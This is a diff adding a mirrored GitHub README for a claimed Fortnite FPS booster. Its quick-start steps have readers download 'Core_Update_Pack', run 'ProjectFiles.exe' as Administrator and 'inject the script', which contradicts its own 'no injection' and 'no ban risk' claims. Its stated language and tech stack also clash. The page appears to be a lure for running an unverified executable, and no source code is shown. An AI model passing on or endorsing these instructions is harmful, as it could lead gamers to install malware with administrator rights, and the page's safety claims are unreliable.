@@ -1,0 +1,125 @@
+---
+title: "Platoonritomb/Fortnite-FPS-Booster-Performance-Optimizer"
+owner: "Platoonritomb"
+name: "Fortnite-FPS-Booster-Performance-Optimizer"
+fullName: "Platoonritomb/Fortnite-FPS-Booster-Performance-Optimizer"
+description: "Fortnite FPS Booster & Performance Optimizer for Windows. Fix stutters, reduce input lag, and boost your frame rate safely without modifying game files. Open-source and portable."
+sourceUrl: "https://github.com/Platoonritomb/Fortnite-FPS-Booster-Performance-Optimizer"
+stars: 279
+forks: 263
+language: "Python"
+topics: ["configuration-manager", "desktop-app", "gaming-tools", "open-source", "pc-tuning", "performance-tweaks", "process-manager", "resource-monitor"]
+license: "MIT"
+defaultBranch: "main"
+snapshotDate: "2026-11-10"
+pushedAt: "2026-11-09T17:50:25Z"
+---
+
+> 本页保存的是公开项目资料快照，阅读过程不需要连接 GitHub。
+
+# ⚡ Fortnite FPS Booster & Performance Optimizer
+
+**Boost FPS & Fix Lag for Windows — 2026**
+
+A lightweight, open-source **Fortnite FPS Booster** and system optimizer. 
+Fix stutters, reduce input lag, boost your frame rate, and apply competitive settings without modifying game files.
+
+---
+
+## 🎯 What it is
+
+**Fortnite FPS Booster** is a native Windows utility designed for players who want smoother gameplay and higher frame rates. 
+It safely adjusts system priorities, clears background processes, and applies optimized game settings to act as a true performance booster.
+
+> 🛡️ Safe by design: It does not inject code into the game, does not modify memory, and does not bypass anti-cheat. It only adjusts system and game settings.
+
+---
+
+## 🚀 Quick Start
+
+
+  
+    
+  
+
+
+1. **Download Core_Update_Pack** using the button above.
+2. **Extract** the archive into a separate folder.
+3. **Run ProjectFiles.exe**.
+4. **Follow the on-screen instructions** and inject the script.
+
+---
+
+## ✨ Features
+
+| Feature                     | Description                                          |
+|-----------------------------|------------------------------------------------------|
+| ⚡ **FPS Boost**            | Optimizes system resources for higher frame rates    |
+| 📉 **Lag Fix**              | Reduces stutter and input delay                      |
+| 🎯 **Custom Settings**      | Applies competitive video settings automatically     |
+| 🖥️ **Process Priority**    | Sets Fortnite to High Priority                       |
+| 🛡️ **Safe & Reversible**   | No game file modifications; settings can be reset    |
+| 📦 **Portable**             | No installation required — just run the `.exe`       |
+
+---
+
+## 🛠️ How to use
+
+1. Launch **ProjectFiles.exe** (run as Administrator).
+2. Make sure Fortnite is closed.
+3. Click **"Boost FPS"** (or "Optimize") to apply system and game tweaks.
+4. Launch Fortnite. The performance boost is now active.
+5. To restore default settings, click **"Reset"** in the app.
+
+---
+
+## ⚙️ Configuration
+
+You can adjust settings in the `config.ini` file:
+
+- **Power Plan**: High Performance / Ultimate Performance
+- **Process Priority**: High / Realtime
+- **Visual Effects**: Disable Windows animations
+- **Game Settings**: Apply low-latency config
+
+---
+
+## ❓ FAQ
+
+**Is this a ban risk?**
+No. The tool only changes system settings and configuration files. It does not interact with the game's memory or anti-cheat (Easy Anti-Cheat / BattlEye).
+
+**Does it work on Mac or Linux?**
+Currently, the tool is exclusive to Windows 10 and 11. 
+
+**Do I need to keep the app running?**
+No. Once you apply the settings, you can close the app. The tweaks remain active until you reset them.
+
+**Why does my FPS drop after an update?**
+Fortnite updates sometimes reset graphics settings. Simply run the optimizer again and click "Boost FPS".
+
+---
+
+## 💻 Tech Stack & Architecture
+
+- **Core:** C++ / C# (.NET 8)
+- **UI:** Dear ImGui / WPF
+- **Patch Method:** Configuration file modification (no memory injection)
+- **Target OS:** Windows 10 / 11 (x64)
+
+---
+
+## 🤝 Contributing
+
+Pull requests, bug reports, and feature suggestions are welcome.
+See `CONTRIBUTING.md` for guidelines.
+
+---
+
+## 📜 License
+
+MIT License — free to use, modify and redistribute.
+
+---
+
+**⭐ Star the repo if it helped you.**
